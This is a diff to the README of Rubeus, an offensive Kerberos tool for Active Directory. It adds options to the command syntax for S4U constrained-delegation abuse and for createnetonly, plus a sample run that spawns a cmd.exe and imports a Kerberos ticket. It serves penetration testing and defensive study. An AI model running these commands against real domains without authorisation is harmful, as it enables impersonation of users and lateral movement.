@@ -115,11 +115,11 @@ Rubeus is licensed under the BSD 3-Clause license.
      Constrained delegation abuse:
 
         Perform S4U constrained delegation abuse:
-            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self]
-            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit] [/nopac]
+            Rubeus.exe s4u </ticket:BASE64 | /ticket:FILE.KIRBI> </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]
+            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/nowrap] [/opsec] [/self] [/bronzebit] [/nopac] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]
 
         Perform S4U constrained delegation abuse across domains:
-            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac]
+            Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac] [/createnetonly:C:\Windows\System32\cmd.exe] [/show]
 
 
      Ticket Forgery:
@@ -242,7 +242,7 @@ Rubeus is licensed under the BSD 3-Clause license.
      Miscellaneous:
 
         Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:
-            Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]
+            Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show] [/ticket:BASE64 | /ticket:FILE.KIRBI]
 
         Reset a user's password from a supplied TGT (AoratoPw):
             Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER] [/targetuser:DOMAIN\USERNAME]
@@ -3401,6 +3401,28 @@ Create a visible command prompt:
     [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
     [+] ProcessID       : 5352
     [+] LUID            : 0x4a091c0
+
+Create a visible command prompt and import a ticket:
+
+    C:\Rubeus>Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show /ticket:ticket.kirbi
+
+     ______        _
+    (_____ \      | |
+     _____) )_   _| |__  _____ _   _  ___
+    |  __  /| | | |  _ \| ___ | | | |/___)
+    | |  \ \| |_| | |_) ) ____| |_| |___ |
+    |_|   |_|____/|____/|_____)____/(___/
+
+    v1.3.3
+
+
+    [*] Action: Create Process (/netonly)
+
+    [*] Showing process : True
+    [+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
+    [+] ProcessID       : 5352
+    [+] LUID            : 0x4a091c0
+    [+] Ticket successfully imported!
 
 
 ### changepw
